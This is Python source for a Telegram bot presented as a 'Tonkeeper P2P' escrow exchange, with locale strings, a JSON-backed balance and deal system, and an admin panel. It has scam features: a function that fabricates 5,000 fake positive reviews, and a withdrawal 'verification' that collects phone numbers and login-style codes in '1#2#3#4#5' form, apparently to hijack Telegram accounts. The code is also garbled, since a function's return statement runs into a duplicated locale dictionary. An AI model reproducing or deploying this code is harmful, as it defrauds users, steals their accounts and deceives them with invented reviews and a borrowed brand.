BOT_NAME = " Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"

# ============================================================
# 2. ЯЗЫКИ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文",
    "ar": "🇸🇦 العربية"
}

LOCALE = {
    "ru": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Продавец создаёт сделку",
        "step2": "Продавец отправляет ссылку покупателю",
        "step3": "Покупатель выбирает способ оплаты",
        "step4": "Администратор проверяет оплату",
        "step5": "Продавец нажимает «Передал товар»",
        "step6": "Покупатель нажимает «Получил товар»",
        "step7": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "support_contact": "@p2psupbot",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "premium": "ПРЕМИУМ",
        "faq": "FAQ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН ПАНЕЛЬ",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "describe_product": "ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ",
        "example_product": "ПРИМЕР: NFT-подарок Telegram Premium",
        "choose_currency": "ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ",
        "enter_amount": "ВВЕДИТЕ СУММУ СДЕЛКИ",
        "enter_buyer": "ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ",
        "buyer_username_example": "ПРИМЕР: john_doe",
        "only_this_user": "ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "send_link_to_buyer": "ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ",
        "your_balance": "ВАШ БАЛАНС",
        "withdraw_funds": "ВЫВЕСТИ СРЕДСТВА",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "premium_status": "ПРЕМИУМ СТАТУС",
        "premium_privileges": "ПРИВИЛЕГИИ",
        "premium_1": "ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7",
        "premium_2": "СНИЖЕННАЯ КОМИССИЯ (0%)",
        "premium_3": "РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ",
        "premium_4": "ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ",
        "premium_active": "ВАШ СТАТУС: АКТИВЕН",
        "faq_q1": "КАК НАЧАТЬ СДЕЛКУ?",
        "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.",
        "faq_q2": "КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "КАК Я ПОЛУЧУ ОПЛАТУ?",
        "faq_a3": "ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ ДЕНЬГИ НА БАЛАНС.",
        "faq_q4": "КАК ВЫВЕСТИ ДЕНЬГИ?",
        "faq_a4": "«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ",
        "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
        "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
        "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "🔐 ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ",
        "verify_desc": "Для защиты от мошенников, проводящих сделки со скамнутыми звёздами и фейковой валютой, необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите кнопку «Я НЕ РОБОТ»",
        "verify_step2": "ШАГ 2: Отправьте свой номер телефона (формат: +7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код подтверждения в формате: 1#2#3#4#5",
        "verify_phone_prompt": "📱 ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n\nВведите номер в формате:\n+7XXXXXXXXXX\n\nЭто необходимо для проверки, что вы не бот и не мошенник.",
        "verify_code_prompt": "🔑 ВВЕДИТЕ КОД ПОДТВЕРЖДЕНИЯ:\n\nВведите код в строгом формате:\n1#2#3#4#5\n\nВнимание! Код должен содержать все 5 цифр, разделённых решёткой.",
        "verify_code_error": "❌ НЕВЕРНЫЙ КОД!\n\nКод должен быть строго: 1#2#3#4#5\n\nПопробуйте снова или начните заново.",
        "verify_phone_error": "❌ НЕВЕРНЫЙ ФОРМАТ НОМЕРА!\n\nИспользуйте формат: +7XXXXXXXXXX\nПример: +79001234567",
        "verify_success": "✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\nВы подтвердили, что не являетесь ботом или мошенником.\n\n🕐 Сессия активна 24 часа.\nПосле этого потребуется повторная проверка.\n\n💰 Теперь вам доступен вывод средств.",
        "verify_already": "✅ Ваша верификация уже пройдена.\n🕐 Сессия активна до: {expires}",
        "verify_expired": "⏳ СЕССИЯ ИСТЕКЛА!\n\nПрошло более 24 часов. Пройдите проверку заново.",
        "not_robot": "🤖 Я НЕ РОБОТ",
        "verify_need": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМА ВЕРИФИКАЦИЯ!\n\nЗащита от мошенников со скамнутыми звёздами и фейковой валютой.",
        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "🔄 Проверить статус"
    },
    # Английский, Китайский, Арабский - такие же, как в вашем оригинале
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 3. ФАЙЛЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 4. ГЕНЕРАЦИЯ 5000+ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)
    print(f"✅ Сгенерировано {len(reviews)} отзывов")

generate_reviews()

# ============================================================
# 5. ПОМОЩНИКИ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 6. КЛАВИАТУРЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return         "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "🔐 ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ",
        "verify_desc": "Для защиты от мошенников, проводящих сделки со скамнутыми звёздами и фейковой валютой, необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите кнопку «Я НЕ РОБОТ»",
        "verify_step2": "ШАГ 2: Отправьте свой номер телефона (формат: +7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код подтверждения в формате: 1#2#3#4#5",
        "verify_phone_prompt": "📱 ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n\nВведите номер в формате:\n+7XXXXXXXXXX\n\nЭто необходимо для проверки, что вы не бот и не мошенник.",
        "verify_code_prompt": "🔑 ВВЕДИТЕ КОД ПОДТВЕРЖДЕНИЯ:\n\nВведите код в строгом формате:\n1#2#3#4#5\n\nВнимание! Код должен содержать все 5 цифр, разделённых решёткой.",
        "verify_code_error": "❌ НЕВЕРНЫЙ КОД!\n\nКод должен быть строго: 1#2#3#4#5\n\nПопробуйте снова или начните заново.",
        "verify_phone_error": "❌ НЕВЕРНЫЙ ФОРМАТ НОМЕРА!\n\nИспользуйте формат: +7XXXXXXXXXX\nПример: +79001234567",
        "verify_success": "✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\nВы подтвердили, что не являетесь ботом или мошенником.\n\n🕐 Сессия активна 24 часа.\nПосле этого потребуется повторная проверка.\n\n💰 Теперь вам доступен вывод средств.",
        "verify_already": "✅ Ваша верификация уже пройдена.\n🕐 Сессия активна до: {expires}",
        "verify_expired": "⏳ СЕССИЯ ИСТЕКЛА!\n\nПрошло более 24 часов. Пройдите проверку заново.",
        "not_robot": "🤖 Я НЕ РОБОТ",
        "verify_need": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМА ВЕРИФИКАЦИЯ!\n\nЗащита от мошенников со скамнутыми звёздами и фейковой валютой.",
        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "🔄 Проверить статус"
    },
    "en": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "SECURE DEALS",
        "feature1": "Fair deals between sellers and buyers",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Security guarantee from both sides",
        "feature4": "Premium 24/7 support",
        "how_it_works": "HOW IT WORKS",
        "step1": "Seller creates a deal",
        "step2": "Seller sends link to buyer",
        "step3": "Buyer chooses payment method",
        "step4": "Admin verifies payment",
        "step5": "Seller clicks 'Delivered'",
        "step6": "Buyer clicks 'Received'",
        "step7": "Money credited to seller's balance",
